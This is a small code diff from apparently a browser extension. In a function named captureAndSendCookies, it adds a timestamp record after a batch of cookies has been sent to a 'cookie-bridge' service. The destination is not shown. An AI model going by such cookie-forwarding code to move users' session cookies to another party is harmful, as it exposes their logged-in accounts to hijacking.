@@ -156,7 +156,10 @@ function captureAndSendCookies() {
         body: JSON.stringify({ cookies })
       });
       if (!res.ok) console.error('cookie-bridge returned', res.status, await res.text());
-      else console.log('cookie-bridge updated with', cookies.length, 'cookies');
+      else {
+        console.log('cookie-bridge updated with', cookies.length, 'cookies');
+        chrome.storage.local.set({ lastCookieSync: Date.now() });
+      }
     } catch (err) {
       console.error('cookie-bridge error:', err.message);
     }
